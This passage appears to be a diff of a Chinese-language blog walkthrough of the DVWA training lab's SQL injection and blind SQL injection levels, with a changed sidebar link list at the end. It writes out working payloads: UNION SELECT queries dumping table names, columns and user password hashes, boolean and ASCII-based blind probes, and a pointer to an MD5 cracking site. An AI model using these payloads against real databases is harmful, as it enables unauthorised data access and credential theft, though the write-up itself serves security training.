+<p>1’ order by 3 #</p>
+<p><img src="/.com//3200280212d7dbbf9417cd5f46a177ce-20250425172844-yv8r8qc.png" alt="3200280212d7dbbf9417cd5f46a177ce"></p>
+<p>由此判断，他只有两个字段</p>
+<ol>
+<li>然后使用联合查询 1’ union select 1,2 # 获取回显位置</li>
+</ol>
+<p><img src="/.com//14b5a5a1f63d114e0c22f9649147a3fd-20250425172850-1pa3jj7.png" alt="14b5a5a1f63d114e0c22f9649147a3fd"></p>
+<p>在对应位置获取数据库名 1’ union select database(),2 #</p>
+<p><img src="/.com//5c64dd66f4fed0355fd501f7ce4768e7-20250425172856-izm3bma.png" alt="5c64dd66f4fed0355fd501f7ce4768e7"></p>
+<p>获取数据库所有表名 1’ union select group_concat(table_name),2 from information_schema.tables where table_schema=database() #</p>
+<p><img src="/.com//60b5183c063b38ef89a35c0f06b11302-20250425172901-19j6jn0.png" alt="60b5183c063b38ef89a35c0f06b11302"></p>
+<pre><code>获取users字段名
+</code></pre>
+<p>1’ union select group_concat(column_name),2 from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database() #</p>
+<p><img src="/.com//9b28bb76146997ac3c1a0310c70c0290-20250425172911-y5kdd7j.png" alt="9b28bb76146997ac3c1a0310c70c0290"></p>
+<ol>
+<li>获取字段值</li>
+</ol>
+<p> 1’ union select password,user from users #</p>
+<p><img src="/.com//830ea6ebdea4a1cafbd68c3b1fc28c7d-20250425172925-6nzb1g3.png" alt="830ea6ebdea4a1cafbd68c3b1fc28c7d"></p>
+<p>现在已经拿到了用户和密码，但密码是加密的，可使用md5自行解密 <a target="_blank" rel="noopener" href="https://cmd5.com/" title="md5在线解密破解,md5解密加密">md5在线解密破解,md5解密加密</a></p>
+<p>‍</p>
+<h3 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h3><ol>
+<li>先选中1，抓一个包，然后发到重放模块，用于测试，可以修改参数，数字型注入</li>
+</ol>
+<p> id修改为1+1，出现报错</p>
+<p><img src="/.com//f290b11a4a46c412831d62057faa65c5-20250425173006-w7azyem.png" alt="f290b11a4a46c412831d62057faa65c5"></p>
+<p>使用order by判断字段数</p>
+<p><img src="/.com//f7080fe5b14c527ac83e957fa6f387af-20250425173025-p1mqx8c.png" alt="f7080fe5b14c527ac83e957fa6f387af"></p>
+<p><img src="/.com//7e576d86d507cb5fda0d514b7f339a7c-20250425173028-dvfygd6.png" alt="7e576d86d507cb5fda0d514b7f339a7c"></p>
+<p>输入联合查询语句</p>
+<p><img src="/.com//94c752d33768607b940ba5c088b8454c-20250425173035-pg461k1.png" alt="94c752d33768607b940ba5c088b8454c"></p>
+<p>剩余步骤同上</p>
+<h3 id="high-3"><a href="#high-3" class="headerlink" title="high"></a>high</h3><p> 1.输入1’，发现报错</p>
+<p><img src="/.com//c3e7ddd980a483947e4df2376ac0d2ff-20250425173042-zcr3d58.png" alt="c3e7ddd980a483947e4df2376ac0d2ff"></p>
+<p>输入联合查询语句</p>
+<p><img src="/.com//1bfc929320387d76beafeb6597f52f71-20250425173052-250wxuk.png" alt="1bfc929320387d76beafeb6597f52f71"></p>
+<p>按上述步骤进行查询</p>
+<h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h3><p> 限制只能为数字   不存在注入</p>
+<p>‍</p>
+<h2 id="8-SQL-injection（blind）盲注"><a href="#8-SQL-injection（blind）盲注" class="headerlink" title="8.SQL injection（blind）盲注"></a>8.SQL injection（blind）盲注</h2><h3 id="low-5"><a href="#low-5" class="headerlink" title="low"></a>low</h3><ol>
+<li>输入 1’ and 1=1 # 可以看到 正常执行</li>
+</ol>
+<p><img src="/.com//34337217f9b95502cde5e73d522aba79-20250425173105-dwfpfwp.png" alt="34337217f9b95502cde5e73d522aba79"></p>
+<p>猜解开数据库长度1’ and length(database())=x #</p>
+<p><img src="/.com//751149ca4a1557d6985de8d258d2cf01-20250425173119-c3wcxww.png" alt="751149ca4a1557d6985de8d258d2cf01"></p>
+<p><img src="/.com//4b90b927976bd2e18252b41bdb1b5f48-20250425173123-ffmyd3b.png" alt="4b90b927976bd2e18252b41bdb1b5f48"></p>
+<p>用aascii猜解数据库名 1’ and ascii(substr(database(),1,1))=100 # 由此确定，第一位ascii是100，对比ascii表（<a target="_blank" rel="noopener" href="http://ascii.wjccx.com/" title="ASCII码对照表-完整ASCII码表-我就查查询">ASCII码对照表-完整ASCII码表-我就查查询</a>）可得 为d</p>
+<p><img src="/.com//43b0bc8b8ca471ba0126fe4f5f6a2a0e-20250425173156-3qawi2b.png" alt="43b0bc8b8ca471ba0126fe4f5f6a2a0e"></p>
+<ol>
+<li>和普通sql注入相同，依次查询库名表名字段名</li>
+</ol>
+<h3 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h3><ol>
+<li>随意选择一个数，然后抓包</li>
+</ol>
+<p><img src="/.com//7ac45f64d1403222c82393a5b210906c-20250425173331-kchwbjb.png" alt="7ac45f64d1403222c82393a5b210906c"></p>
+<p>修改参数 1 and length(database())=4 #，根据布尔 盲注判断，，数据库名为4</p>
+<p><img src="/.com//a4553a678f1d6482e5fb8ce9841c3538-20250425173338-wyz18se.png" alt="a4553a678f1d6482e5fb8ce9841c3538"></p>
+<p>下面依旧使用sql语句进行查询，步骤同上</p>
+<p>‍</p>
+<h3 id="high-4"><a href="#high-4" class="headerlink" title="high"></a>high</h3><ol>
+<li>1’ and 1=1 # 测试，发现成功执行</li>
+</ol>
+<p><img src="/.com//ca86f4d80df4b3feccbf28e4ccdaf857-20250425173346-utigrlz.png" alt="ca86f4d80df4b3feccbf28e4ccdaf857"></p>
+<p>盲注，测试数据库名长度 1’ and length(database())=4 #</p>
+<p><img src="/.com//31274efc2f2bde6b41b806798e997547-20250425173353-ae59gvt.png" alt="31274efc2f2bde6b41b806798e997547"></p>
+<p>接下来的步骤同上</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/" data-id="cmaxygi0l000doc7k8l7ogc1u" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -1240,19 +1315,19 @@
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/">(no title)</a>
-          </li>
-        
-          <li>
             <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/">(no title)</a>
+            <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/">(no title)</a>
+            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/">(no title)</a>
           </li>
         
       </ul>
